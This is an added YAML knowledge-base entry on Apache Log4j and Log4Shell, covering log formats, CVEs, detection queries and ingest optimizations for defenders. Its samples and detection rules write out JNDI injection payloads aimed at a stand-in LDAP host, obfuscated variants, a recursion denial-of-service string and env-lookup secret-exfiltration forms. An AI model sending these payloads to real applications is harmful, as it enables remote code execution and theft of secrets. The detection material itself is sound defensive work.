@@ -1,0 +1,285 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: log4j
+name: Apache Log4j (Java application logs)
+short: Log4j
+aka:
+  - Log4j 2
+  - log4j-core
+  - Log4j 1.x
+  - Log4Shell
+  - reload4j
+vendor: Apache Software Foundation
+category: web
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - java
+  - logging-library
+  - application-logs
+  - log4shell
+  - jndi
+summary: The most widely used Java logging library. It is embedded in application servers, middleware, SIEMs and appliances, so "log4j" logs are whatever a Java application writes through it, usually PatternLayout text or JSON. In 2021 Log4Shell (CVE-2021-44228) made the logger itself the attack surface. Any logged string with a ${jndi:…} lookup could make the JVM load remote code, so attackers sprayed it into every header and form field on the internet.
+sourcetypes:
+  - st: log4j
+    desc: Java application log written by Log4j (PatternLayout text or JSON layout); also Splunk's pretrained log4j sourcetype
+facts:
+  First released: 2001 (Log4j 1.x); Log4j 2 in 2014; 1.x end of life since 2015
+  Current version: Log4j 2.25.x (Java 8+); 2.12.x / 2.3.x security lines for Java 7 / 6 are no longer maintained
+  Language: Java (ports — log4net for .NET, log4cxx for C++, log4js share the name, not the code or the CVEs)
+  Embedded in: Tomcat / Spring apps, Elasticsearch, Kafka, Solr, VMware vCenter, Cisco and many appliances
+  Log types: Application events (any level), access logs written by apps, status logger, audit trails
+  Log transport: File / RollingFile appenders, Socket / Syslog / Kafka / HTTP appenders, stdout in containers
+  Log format: PatternLayout text by default (%d %p [%t] %c - %m%n); JsonTemplateLayout (ECS, GELF) for structured output
+  Typical volume: Highly variable — a few lines a minute to thousands per second; stack traces make lines multi-line
+placement:
+  slots:
+    - dmz
+    - internal
+    - cloud
+  items:
+    - slot: dmz
+      title: Internet-facing Java applications
+      desc: Web apps, VPN portals and APIs that log request data (user agent, username, headers). This is where Log4Shell payloads arrived, and where they get logged if the library is patched.
+    - slot: internal
+      title: Middleware and vendor appliances
+      desc: Java inside vCenter, SIEM / ITSM tools, Kafka, Elasticsearch. These hosts are often unpatched and their logs are not collected. An SBOM or a file scan for log4j-core JARs finds them.
+    - slot: cloud
+      title: Containers and serverless JVMs
+      desc: Spring Boot services in Kubernetes log JSON to stdout. A shaded or fat JAR can hide an old log4j-core from simple version checks.
+howItWorks:
+  - title: Loggers, appenders, layouts
+    body: Code calls logger.info(…). The logger's level filters the event, appenders (file, socket, Kafka) deliver it, and the layout formats it. The pattern %d %p [%t] %c - %m%n gives the common "date LEVEL [thread] logger - message" line.
+  - title: Lookups
+    body: Log4j 2 expands ${prefix:name} lookups (env, sys, ctx, java, jndi…) in configuration and, before 2.15.0, also in logged messages. That message lookup is the root cause of Log4Shell. Attacker-controlled text that gets logged can trigger a JNDI fetch from an LDAP / RMI server.
+  - title: The Log4Shell chain
+    body: The payload (e.g. in User-Agent) is logged, and the JNDI lookup calls out to the attacker's LDAP server. The server returns a reference to a Java class, which the JVM loads and runs. Even without code loading, ${env:…} lookups inside a DNS name leak secrets.
+  - title: Fixes and mitigations
+    body: 2.15.0 disabled message lookups by default, 2.16.0 removed them and disabled JNDI by default, and 2.17.0 / 2.17.1 fixed recursion and the JDBC appender. Older mitigations (formatMsgNoLookups, removing JndiLookup.class) were partial.
+  - title: Log4j 1.x
+    body: End of life with its own unpatched flaws (SocketServer deserialisation, JMSAppender, JDBCAppender SQL injection). reload4j is a drop-in fork. Migrating to Log4j 2 or Logback is the real fix.
+traffic:
+  handles:
+    - Application log events from Java code
+    - Attacker-controlled strings (headers, usernames, form fields) that apps log
+    - JNDI / LDAP / RMI / DNS lookups (vulnerable versions)
+    - Socket, Syslog, Kafka and HTTP appender output
+    - Configuration reloads (monitorInterval)
+  flow:
+    - step: Request
+      desc: A client sends input (header, parameter, username) to a Java app.
+    - step: Log call
+      desc: The app logs it, e.g. "Login failed for user {}".
+    - step: Format
+      desc: The layout formats the event; vulnerable versions expand ${…} lookups here.
+    - step: Lookup
+      desc: A jndi lookup reaches out over LDAP / RMI / DNS to the given host.
+    - step: Append
+      desc: The appender writes the line to a file, socket or stdout.
+    - step: Collect
+      desc: Cribl Edge or an agent tails the file and forwards to Stream.
+logs:
+  - type: PatternLayout application log
+    sourcetype: log4j
+    format: text
+    share: 80–100 %
+    avg: ~200 B
+    desc: The common "%d %-5p [%t] %c - %m%n" layout. Here a patched app has logged a Log4Shell probe carried in a username. The payload is what you hunt for.
+    pattern: '^(?<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) (?<level>[A-Z]+)\s+\[(?<thread>[^\]]+)\] (?<logger>\S+)\s+- (?<message>.*)$'
+    key:
+      - level
+      - logger
+      - message
+    noise:
+      - thread
+    sample: '2026-11-12 02:14:22,508 WARN  [http-nio-8080-exec-7] com.example.auth.LoginController - Login failed for user ${jndi:ldap://203.0.113.9:1389/a} from 203.0.113.45'
+  - type: JSON layout (ECS)
+    sourcetype: log4j
+    format: json
+    share: varies
+    avg: ~350 B
+    desc: JsonTemplateLayout with the ECS event template, common in containers. The fields are already structured. error.type / error.message show JNDI and naming exceptions from blocked callbacks.
+    key:
+      - log.level
+      - log.logger
+      - message
+      - error.type
+      - service.name
+    noise:
+      - ecs.version
+      - process.thread.name
+    sample: '{"@timestamp":"2026-11-12T02:15:03.117Z","ecs.version":"1.2.0","log.level":"ERROR","message":"Error looking up JNDI resource [ldap://203.0.113.9:1389/a]","process.thread.name":"http-nio-8080-exec-9","log.logger":"org.apache.logging.log4j.core.lookup.JndiLookup","error.type":"javax.naming.CommunicationException","error.message":"203.0.113.9:1389","service.name":"orders-api"}'
+cves:
+  - id: CVE-2021-44228
+    cvss: 10.0
+    year: 2021
+    kev: true
+    scope: device
+    title: Log4Shell — JNDI lookup in logged data gives unauthenticated remote code execution
+    affected: log4j-core 2.0-beta9 to 2.14.1 (excluding the 2.3.1 and 2.12.2 security releases)
+    fixed: 2.15.0 (Java 8+), 2.12.2 (Java 7), 2.3.1 (Java 6)
+    detect: ${jndi:ldap|rmi|dns| strings (and obfuscated forms) in any logged field; outbound LDAP (389, 1389, 636) / RMI (1099) from app servers; JndiLookup errors in the log itself.
+    avoid: Upgrade to 2.17.1 or later; block egress from app servers; inventory JARs (including shaded) with an SBOM or file scan.
+  - id: CVE-2021-45046
+    cvss: 9.0
+    year: 2021
+    kev: true
+    scope: device
+    title: Incomplete 2.15.0 fix — Thread Context (MDC) lookups still reach JNDI in non-default patterns
+    affected: log4j-core 2.0-beta9 to 2.15.0 (excluding 2.3.1 and 2.12.3)
+    fixed: 2.16.0 (Java 8+), 2.12.3 (Java 7), 2.3.1 (Java 6)
+    detect: Same payload patterns placed in values that end up in the MDC (headers copied into ${ctx:…}); 2.15.0 hosts still making outbound LDAP calls.
+    avoid: Upgrade past 2.16.0; remove ${ctx:…} lookups from pattern layouts.
+  - id: CVE-2021-45105
+    cvss: 5.9
+    year: 2021
+    kev: false
+    scope: device
+    title: Uncontrolled recursion in self-referential lookups — denial of service
+    affected: log4j-core 2.0-alpha1 to 2.16.0 (excluding 2.3.1 and 2.12.3)
+    fixed: 2.17.0 (Java 8+), 2.12.3 (Java 7), 2.3.1 (Java 6)
+    detect: StackOverflowError in logs after inputs such as ${${::-${::-$${::-j}}}}; JVM crashes on apps logging context data.
+    avoid: Upgrade; avoid context lookups in layouts.
+  - id: CVE-2021-44832
+    cvss: 6.6
+    year: 2021
+    kev: false
+    scope: device
+    title: JDBC appender with a JNDI data source — RCE for an attacker who can change the logging config
+    affected: log4j-core 2.0-beta7 to 2.17.0 (excluding 2.3.2 and 2.12.4)
+    fixed: 2.17.1 (Java 8+), 2.12.4 (Java 7), 2.3.2 (Java 6)
+    detect: Changes to log4j2.xml / properties adding JDBC appenders or jndi data sources; monitorInterval reloads outside deployments.
+    avoid: Upgrade; make logging configuration read-only to the application user.
+  - id: CVE-2019-17571
+    cvss: 9.8
+    year: 2019
+    kev: false
+    scope: device
+    title: Log4j 1.2 SocketServer deserialisation of untrusted log data — remote code execution
+    affected: Log4j 1.2 up to 1.2.17 (end of life, no fix)
+    detect: Java processes listening for SocketAppender traffic (often 4560/4712) reachable from untrusted networks; serialized Java (AC ED 00 05) in that traffic.
+    avoid: Do not run SocketServer; migrate off Log4j 1.x (Log4j 2, Logback or reload4j).
+  - id: CVE-2022-22965
+    cvss: 9.8
+    year: 2022
+    kev: true
+    scope: traffic
+    title: Spring4Shell — Spring Framework data-binding RCE on Tomcat WAR deployments (attack seen in Java app logs)
+    affected: Spring Framework 5.3.0–5.3.17, 5.2.0–5.2.19 and older on JDK 9+, deployed as a WAR on Tomcat
+    fixed: Spring Framework 5.3.18, 5.2.20
+    detect: Parameters class.module.classLoader.resources.context.parent.pipeline.first.* in request or app logs; new .jsp files written to the webapps ROOT.
+    avoid: Upgrade Spring (and Tomcat 10.0.20 / 9.0.62 / 8.5.78); restrict data binding with disallowedFields.
+detections:
+  - title: JNDI lookup strings in logged data
+    severity: high
+    signals:
+      - ${jndi:ldap / rmi / dns / ldaps / iiop in a message
+      - source IPs from the internet
+      - any logger, any level
+    why: Seeing a payload means someone attacked that application. Fully patched apps still log it, which tells you exposure; vulnerable ones also make the callback.
+    kql: |-
+      dataset="java_app_logs" sourcetype="log4j"
+      | where message matches regex "(?i)\\$\\{\\s*jndi\\s*:"
+      | extract "(?i)jndi:(?<proto>[a-z]+)://(?<callback>[^/}:]+)" from message
+      | summarize hits=count(), loggers=make_set(logger, 10) by callback, proto
+    mitre:
+      - T1190
+  - title: Obfuscated lookup payloads
+    severity: high
+    signals:
+      - ${lower:j}, ${upper:…}, ${::-j}, ${env:…:-j}
+      - nested ${ inside ${
+      - URL-encoded %24%7B
+    why: Attackers obfuscated payloads to evade WAF and log filters. Real application messages almost never contain nested ${ … } lookups.
+    kql: |-
+      dataset="java_app_logs" sourcetype="log4j"
+      | where message matches regex "\\$\\{[^}]*\\$\\{" or message has_any ("${lower:", "${upper:", "${::-", "%24%7B")
+      | summarize count() by logger, message
+    mitre:
+      - T1190
+      - T1027
+  - title: Secret exfiltration via env / sys lookups
+    severity: critical
+    signals:
+      - ${env:AWS_SECRET_ACCESS_KEY}, ${env:…PASSWORD}
+      - ${sys:java.version} inside a hostname
+      - DNS callback domains (interactsh, dnslog, burpcollaborator)
+    why: Even without code execution, lookups placed in a DNS name send environment secrets to the attacker's resolver.
+    kql: |-
+      dataset="java_app_logs" sourcetype="log4j"
+      | where message has_any ("${env:", "${sys:", "${java:") or message has_any ("interact.sh", "oast.", "dnslog", "burpcollaborator")
+      | project _time, logger, level, message
+    mitre:
+      - T1552.001
+      - T1048.003
+  - title: JNDI / naming errors from the logger itself
+    severity: medium
+    signals:
+      - JndiLookup or JndiManager logger names
+      - javax.naming.CommunicationException / NamingException
+      - "Error looking up JNDI resource"
+    why: A blocked or failed callback leaves an error from Log4j's own lookup classes. That is strong evidence that a payload reached a vulnerable or partly mitigated version.
+    kql: |-
+      dataset="java_app_logs" sourcetype="log4j"
+      | where message has "JNDI" or message has "javax.naming"
+      | summarize count() by level, message
+    mitre:
+      - T1190
+      - T1105
+  - title: Spring4Shell class-loader parameters
+    severity: high
+    signals:
+      - class.module.classLoader in request parameters
+      - pipeline.first.pattern / suffix / directory
+      - new .jsp under webapps/ROOT
+    why: The Spring4Shell exploit rewrites Tomcat's access-log valve to drop a JSP webshell. The parameter names are unique to the attack.
+    kql: |-
+      dataset="java_app_logs"
+      | where message has "class.module.classLoader" or message has "pipeline.first."
+      | project _time, logger, level, message
+    mitre:
+      - T1190
+      - T1505.003
+optimizations:
+  - title: Drop DEBUG and TRACE
+    saving: 20–70 %
+    fn: Drop
+    how: Debug logging left on in production is common and huge. Keep WARN and above for the SIEM, and INFO in Lake if needed. Always keep lines with ${ or jndi in them, whatever the level.
+    expr: "['DEBUG','TRACE'].includes(level) && !/\\$\\{|jndi/i.test(message || '')"
+  - title: Merge stack traces into one event
+    saving: 10–30 % (event count)
+    fn: Event Breaker
+    how: Break on the timestamp at line start so "at …" and "Caused by:" lines stay with their event. This avoids thousands of one-line fragments.
+    expr: "breaker: /^\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2},\\d{3} /  (max event 64 KB)"
+  - title: Suppress repeated errors
+    saving: 10–40 %
+    fn: Suppress
+    how: A failing dependency produces the same ERROR thousands of times a minute. Keep one per logger and message per minute, with a count.
+    expr: "key: `${logger}:${message}`  allow 1 / 60s  when level == 'ERROR'"
+  - title: Route by value
+    saving: SIEM licence
+    fn: Routes
+    how: Lines with payload markers, auth loggers, WARN+ → SIEM; INFO operational chatter → Cribl Lake.
+    expr: "/\\$\\{|jndi|classLoader/i.test(message) || ['WARN','ERROR','FATAL'].includes(level) → SIEM  |  else → Lake"
+references:
+  - title: Apache Log4j security vulnerabilities
+    url: https://logging.apache.org/security.html
+  - title: Log4j 2 — Layouts (PatternLayout, JsonTemplateLayout)
+    url: https://logging.apache.org/log4j/2.x/manual/layouts.html
+  - title: CISA — Apache Log4j vulnerability guidance
+    url: https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
+  - title: NVD — CVE-2021-44228
+    url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - title: Spring Framework RCE (CVE-2022-22965) early announcement
+    url: https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  - title: Spring — CVE-2022-22965 advisory (affected and fixed versions)
+    url: https://spring.io/security/cve-2022-22965
+related:
+  - apache-httpd
+  - nginx
+  - iis
+  - vmware-esxi
+  - linux-syslog
